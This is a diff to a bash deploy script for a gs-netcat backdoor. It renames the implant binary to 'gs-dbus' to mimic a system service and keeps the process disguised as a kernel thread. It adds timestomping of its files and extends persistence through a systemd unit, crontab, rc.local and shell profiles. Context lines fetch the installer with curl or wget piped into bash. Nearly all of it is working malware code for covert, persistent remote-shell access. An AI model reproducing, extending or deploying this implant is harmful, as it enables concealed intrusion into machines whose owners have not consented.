@@ -25,7 +25,8 @@
 #		- Verbose output
 #		- Shorter timeout to restart crontab etc
 #       - Often used like this:
-#         GS_DEBUG=1 GS_USELOCAL=1 GS_NOSTART=1 GS_NOINST=1 ./deploy.sh
+#         GS_HOST=127.0.0.1 GS_PORT=4443 GS_DEBUG=1 GS_USELOCAL=1 GS_NOSTART=1 GS_NOINST=1 ./deploy.sh
+#         GS_HOST=127.0.0.1 GS_PORT=4443 GS_DEBUG=1 GS_USELOCAL=1 GS_USELOCAL_GSNC=../tools/gs-netcat GS_NOSTART=1 GS_NOINST=1 ./deploy.sh
 # GS_USELOCAL=1
 #       - Use local binaries (do not download)
 # GS_USELOCAL_GSNC=<path to gs-netcat binary>
@@ -55,7 +56,7 @@ URL_DEPLOY="gsocket.io/x"
 DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
 DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
 # DL_CMD="$DL_CRL"
-BIN_HIDDEN_NAME_DEFAULT=gs-bd
+BIN_HIDDEN_NAME_DEFAULT=gs-dbus
 PROC_HIDDEN_NAME_DEFAULT="[kcached/0]"
 CY="\033[1;33m" # yellow
 CG="\033[1;32m" # green
@@ -98,8 +99,14 @@ exit_alldone()
 	exit_code 0
 }
 
+fs_make_old()
+{
+	[[ -f /etc/ld.so.conf ]] || return
+	touch -r /etc/ld.so.conf "$1"
+}
+
 # Test if directory can be used to store executeable
-# try_dstdir "/tmp/.gs-foobar/"
+# try_dstdir "/tmp/.gs-foobar"
 # Return 0 on success.
 try_dstdir()
 {
@@ -128,8 +135,8 @@ try_dstdir()
 	# /bin/true might be a symlink to /usr/bin/true
 	if [[ -f "${trybin}" ]]; then
 		# Between 28th of April and end of May we accidentially
-		# overwrote /bin/true with gs-bd binary. Thus we use -g
-		# which is a valid argument for gs-bd, true and id
+		# overwrote /bin/true with gs-dbus binary. Thus we use -g
+		# which is a valid argument for gs-dbus, true and id
 		# and returns 0 (true)
 		"${trybin}" -g &>/dev/null || { return 103; } # FAILURE
 	else 
@@ -151,7 +158,7 @@ init_dstbin()
 	fi
 
 	# Try systemwide installation first
-	try_dstdir "${GS_PREFIX}/usr/bin/" && return
+	try_dstdir "${GS_PREFIX}/usr/bin" && return
 
 	# Try user installation
 	try_dstdir "${GS_PREFIX}${HOME}/.config/dbus" && return
@@ -160,7 +167,7 @@ init_dstbin()
 	try_dstdir "/tmp/.gsusr-${UID}" && return
 
 	# Try /dev/shm as last resort
-	try_dstdir "/dev/shm/" && return
+	try_dstdir "/dev/shm" && return
 
 	echo -e 1>&2 "${CR}ERROR: Can not find writeable and executable directory.${CN}"
 	WARN "Try setting GS_DSTDIR= to a writeable and executable directory."
@@ -234,7 +241,7 @@ init_vars()
 
 	# OSX's pkill matches the hidden name and not the original binary name.
 	# Because we hide as '-bash' we can not use pkill all -bash.
-	# 'killall' however matches gs-bd and on OSX we thus force killall
+	# 'killall' however matches gs-dbus and on OSX we thus force killall
 	if [[ $OSTYPE == *darwin* ]]; then
 		KL_CMD="killall"
 		KL_CMD_RUNCHK_UARG=("-0" "-u${USER}")
@@ -323,17 +330,24 @@ init_setup()
 	NOTE_DONOTREMOVE="# DO NOT REMOVE THIS LINE. SEED PRNG. #${BIN_HIDDEN_NAME}-kernel"
 
 	USER_SEC_FILE="$(dirname "${DSTBIN}")/${SEC_NAME}"
-	RCLOCAL_LINE="HOME=$HOME TERM=xterm-256color SHELL=$SHELL GS_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(command -v bash) -c \"cd /root; exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\""
+
+	# Do not add TERM= or SHELL= here because we do not like that to show in gs-dbus.service
+	[[ -n $GS_HOST ]] && ENV_LINE+=("GS_HOST='${GS_HOST}'")
+	[[ -n $GS_PORT ]] && ENV_LINE+=("GS_PORT='${GS_PORT}'")
+	# Add an empty item so that ${ENV_LINE[*]}GS_ARGS= adds an extra space between
+	[[ ${#ENV_LINE[@]} -ne 0 ]] && ENV_LINE+=("")
+
+	RCLOCAL_LINE="${ENV_LINE[*]}HOME=$HOME SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(command -v bash) -c \"cd /root; exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\" 2>/dev/null"
 
 	# There is no reliable way to check if a process is running:
 	# - Process might be running under different name. Especially OSX checks for the orginal name
 	#   but not the hidden name.
-	# - pkill or killall may no longer be in the PATH (especially when executed from crontab)
+	# - pkill or killall may have moved.
 	# The best we can do:
-	# 1. If pidof/killall/pkill exist _AND_ daemon is running then do nothing.
-	# 2. Otherwise start gs-bd as DAEMON. The daemon will exit (fully) if GS-Address is already in use.
-	PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || (TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}')"
-	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\""
+	# 1. Try pkill/killall _AND_ daemon is running then do nothing.
+	# 2. Otherwise start gs-dbus as DAEMON. The daemon will exit (fully) if GS-Address is already in use.
+	PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || (${ENV_LINE[*]}TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}' 2>/dev/null)"
+	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || ${ENV_LINE[*]}SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\" 2>/dev/null"
 
 	# check that xxd is working as expected (alpine linux does not have -r option)
 	if [[ "$(echo "thcwashere" | xxd -ps -c1024 2>/dev/null| xxd -r -ps 2>/dev/null)" = "thcwashere" ]]; then
@@ -371,31 +385,60 @@ uninstall_rmdir()
 
 uninstall_rc()
 {
-	[[ ! -f "$1" ]] && return # File does not exist
+	local hname
+	local fn
+	hname="$2"
+	fn="$1"
 
-	grep -F -- "${BIN_HIDDEN_NAME}" "$1" &>/dev/null || return # not installed
+	[[ ! -f "$fn" ]] && return # File does not exist
 
-	touch -r "${1}" "${1}-ts"
-	[[ ! -f "${1}-ts" ]] && return # permission denied
-	D="$(grep -v -F -- "${BIN_HIDDEN_NAME}" "$1")"
-	echo "$D" >"${1}"
-	touch -r "${1}-ts" "${1}"
-	rm -f "${1}-ts"
+	grep -F -- "${hname}" "$fn" &>/dev/null || return # not installed
 
-	[[ ! -s "${1}" ]] && rm -f "${1}" 2>/dev/null # delete zero size file
+	echo 1>&2 "Removing ${fn}..."
+	touch -r "${fn}" "${fn}-ts"
+	[[ ! -f "${fn}-ts" ]] && return # permission denied
+	D="$(grep -v -F -- "${hname}" "$fn")"
+	echo "$D" >"${fn}"
+	touch -r "${fn}-ts" "${fn}"
+	rm -f "${fn}-ts"
+
+	[[ ! -s "${fn}" ]] && rm -f "${fn}" 2>/dev/null # delete zero size file
 }
+
+uninstall_service()
+{
+	local sn
+	local sf
+	sn="$1"
+	sf="/etc/systemd/system/${sn}.service"
+
+	[[ ! -f "${sf}" ]] && return
+
+	command -v systemctl >/dev/null && [[ $UID -eq 0 ]] && {
+		# STOPPING would kill the current login shell. Do not stop it.
+		# systemctl stop "${SERVICE_HIDDEN_NAME}" &>/dev/null
+		systemctl disable "${sn}" 2>/dev/null
+	}
+
+	uninstall_rm "${sf}"
+} 
 
 # Rather important function especially when testing and developing this...
 uninstall()
 {
 	uninstall_rm "${GS_PREFIX}${HOME}/.config/dbus/${BIN_HIDDEN_NAME}"
+	uninstall_rm "${GS_PREFIX}${HOME}/.config/dbus/gs-bd"
 	uninstall_rm "${GS_PREFIX}/usr/bin/${BIN_HIDDEN_NAME}"
+	uninstall_rm "${GS_PREFIX}/usr/bin/gs-bd"
 	uninstall_rm "/dev/shm/${BIN_HIDDEN_NAME}"
 	uninstall_rm "/tmp/.gsusr-${UID}/${BIN_HIDDEN_NAME}"
 
 	uninstall_rm "${RCLOCAL_DIR}/${SEC_NAME}"
+	uninstall_rm "${RCLOCAL_DIR}/gs-bd.dat"
 	uninstall_rm "${GS_PREFIX}${HOME}/.config/dbus/${SEC_NAME}"
+	uninstall_rm "${GS_PREFIX}${HOME}/.config/dbus/gs-bd.dat"
 	uninstall_rm "${GS_PREFIX}/usr/bin/${SEC_NAME}"
+	uninstall_rm "${GS_PREFIX}/usr/bin/gs-bd.dat"
 	uninstall_rm "/dev/shm/${SEC_NAME}"
 
 	uninstall_rmdir "${GS_PREFIX}${HOME}/.config/dbus"
@@ -408,26 +451,26 @@ uninstall()
 	uninstall_rmdir "${TMPDIR}"
 
 	# Remove from login script
-	uninstall_rc "${GS_PREFIX}${HOME}/.bash_profile"
-	uninstall_rc "${GS_PREFIX}${HOME}/.bash_login"
-	uninstall_rc "${GS_PREFIX}${HOME}/.bashrc"
-	uninstall_rc "${GS_PREFIX}${HOME}/.zshrc"
-	uninstall_rc "${GS_PREFIX}${HOME}/.profile"
-	uninstall_rc "${GS_PREFIX}/etc/rc.local"
+	for fn in ".bash_profile" ".bash_login" ".bashrc" ".zshrc" ".profile"; do
+		uninstall_rc "${GS_PREFIX}${HOME}/${fn}" "${BIN_HIDDEN_NAME}"
+		uninstall_rc "${GS_PREFIX}${HOME}/${fn}" "gs-bd"
+	done 
+	uninstall_rc "${GS_PREFIX}/etc/rc.local" "${BIN_HIDDEN_NAME}" 
+	uninstall_rc "${GS_PREFIX}/etc/rc.local" "gs-bd" 
 
 	# Remove crontab
 	if [[ ! $OSTYPE == *darwin* ]]; then
-		command -v crontab >/dev/null && crontab -l 2>/dev/null | grep -v -F -- "${BIN_HIDDEN_NAME}" | crontab - 2>/dev/null 
+		command -v crontab >/dev/null && crontab -l 2>/dev/null | grep -v -F -- "${BIN_HIDDEN_NAME}" | grep -v -F -- "gs-bd" | crontab - 2>/dev/null 
 	fi
 
 	# Remove systemd service
-	# STOPPING would kill the current login shell. Do not stop it.
-	# systemctl stop "${SERVICE_HIDDEN_NAME}" &>/dev/null
-	[[ -f "${SERVICE_FILE}" ]] && {
-		command -v systemctl >/dev/null && [[ $UID -eq 0 ]] && { systemctl disable "${BIN_HIDDEN_NAME}" 2>/dev/null && systemctl daemon-reload 2>/dev/null; } 
-		uninstall_rm "${SERVICE_FILE}"
-	}
+	uninstall_service "${SERVICE_HIDDEN_NAME}"
+	uninstall_service "gs-bd"
+	systemctl daemon-reload 2>/dev/null
+
+	## Systemd's gs-dbus.dat
 	uninstall_rm "${SYSTEMD_SEC_FILE}"
+	uninstall_rm "/etc/system/system/gs-bd.dat"
 
 	echo -e 1>&2 "${CG}Uninstall complete.${CN}"
 	echo -e 1>&2 "--> Use ${CM}${KL_CMD:-pkill} ${BIN_HIDDEN_NAME}${CN} to terminate all running shells."
@@ -504,6 +547,7 @@ gs_secret_write()
 {
 	echo "$GS_SECRET" >"$1"
 	chmod 600 "$1"
+	fs_make_old "$1"
 }
 
 install_system_systemd()
@@ -532,12 +576,13 @@ Type=simple
 Restart=always
 RestartSec=10
 WorkingDirectory=/root
-ExecStart=/bin/bash -c \"GS_ARGS='-k $SYSTEMD_SEC_FILE -ilq' exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\"
+ExecStart=/bin/bash -c \"${ENV_LINE[*]}GS_ARGS='-k $SYSTEMD_SEC_FILE -ilq' exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\"
 
 [Install]
 WantedBy=multi-user.target" >"${SERVICE_FILE}"
 
 	chmod 600 "${SERVICE_FILE}"
+	fs_make_old "${SERVICE_FILE}"
 	gs_secret_write "$SYSTEMD_SEC_FILE"
 
 	systemctl enable "${SERVICE_HIDDEN_NAME}" &>/dev/null || { rm -f "${SERVICE_FILE}" "${SYSTEMD_SEC_FILE}"; return; } # did not work... 
@@ -617,7 +662,7 @@ install_user_crontab()
 
 	local cr_time
 	cr_time="59 * * * *"
-	[[ -n "$GS_DEBUG" ]] && cr_time="* * * * *" # easier to debug if this happens every minute..
+	# [[ -n "$GS_DEBUG" ]] && cr_time="* * * * *" # easier to debug if this happens every minute..
 	(crontab -l 2>/dev/null && \
 	echo "$NOTE_DONOTREMOVE" && \
 	echo "${cr_time} $CRONTAB_LINE") | crontab - 2>/dev/null || { FAIL_OUT; return; }
@@ -830,6 +875,8 @@ test_network()
 	# 2. Exit=202 after n seconds. Firewalled/DNS?
 	# 3. Exit=203 if TCP to GSRN is refused.
 	# 3. Exit=61 on GS-Connection refused. (server does not exist)
+	# Do not need GS_ENV[*] here because all env variables are exported
+	# when exec is used.
 	err_log=$(_GSOCKET_SERVER_CHECK_SEC=10 GS_ARGS="-s ${GS_SECRET}" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
 	ret=$?
 
@@ -927,7 +974,7 @@ try()
 # binaries and fail hard if none could be found.
 try_any()
 {
-	targets="x86_64-alpine i386-alpine x86_64-debian aarch64-linux armv6l-linux x86_64-cygwin x86_64-freebsd x86_64-osx"
+	targets="x86_64-alpine i386-alpine aarch64-linux armv6l-linux x86_64-cygwin x86_64-freebsd x86_64-osx"
 	for osarch in $targets; do
 		[[ "$osarch" = "$OSARCH" ]] && continue # Skip the default OSARCH (already tried)
 		try "$osarch"
@@ -968,9 +1015,9 @@ gs_start()
 	[[ -n "$IS_GS_RUNNING" ]] && return
 
 	# Scenario to consider:
-	# GS_UNDO=1 ./deploy.sh -> removed all binaries but user does not issue 'pkill gs-bd'
-	# ./deploy.sh -> re-installs new secret. Start gs-bd with _new_ secret.
-	# Now two gs-bd's are running (which is correct)
+	# GS_UNDO=1 ./deploy.sh -> removed all binaries but user does not issue 'pkill gs-dbus'
+	# ./deploy.sh -> re-installs new secret. Start gs-dbus with _new_ secret.
+	# Now two gs-dbus's are running (which is correct)
 	if [[ -n "$KL_CMD" ]]; then
 		${KL_CMD} "${KL_CMD_RUNCHK_UARG[@]}" "${BIN_HIDDEN_NAME}" 2>/dev/null && IS_OLD_RUNNING=1
 	elif command -v pidof >/dev/null; then
@@ -982,7 +1029,7 @@ gs_start()
 	IS_NEED_START=1
 
 	if [[ -n "$IS_OLD_RUNNING" ]]; then
-		# HERE: already running.
+		# HERE: OLD is already running.
 		if [[ -n "$IS_SKIPPED" ]]; then
 			# HERE: Already running. Skipped installation (sec.dat has not changed).
 			SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
@@ -1001,7 +1048,13 @@ gs_start()
 	fi
 
 	if [[ -n "$IS_NEED_START" ]]; then
-		(TERM=xterm-256color GS_ARGS="-s $GS_SECRET -liD" exec -a "$PROC_HIDDEN_NAME" "$DSTBIN")
+		# We need an 'eval' here because the ENV_LINE[*] needs to be expanded
+		# and then executed.
+		# This wont work:
+		#     FOO="X=1" && ($FOO id)  # => -bash: X=1: command not found
+		# This does work:
+		#     FOO="X=1" && (eval $FOO id)
+		(eval ${ENV_LINE[*]}TERM=xterm-256color GS_ARGS=\"-s $GS_SECRET -liD\" exec -a \"$PROC_HIDDEN_NAME\" \"$DSTBIN\") || errexit
 		IS_GS_RUNNING=1
 	fi
 }
@@ -1051,7 +1104,7 @@ WARN_EXECFAIL
 [[ -z $GS_NOINST ]] && [[ $UID -eq 0 ]] && install_system
 
 # Try to install to user's login script or crontab (if not installed as SYSTEMD)
-[[ -z $GS_NOINST ]] && [[ -z "$IS_INSTALLED" -o -z "$IS_SYSTEMD" ]] && install_user
+[[ -z $GS_NOINST ]] && [[ -z "$IS_INSTALLED" || -z "$IS_SYSTEMD" ]] && install_user
 
 [[ -n $GS_NOINST ]] && echo -e 2>&1 "GS_NOINST is set. Skipping installation."
 # -----END Install permanentally-----
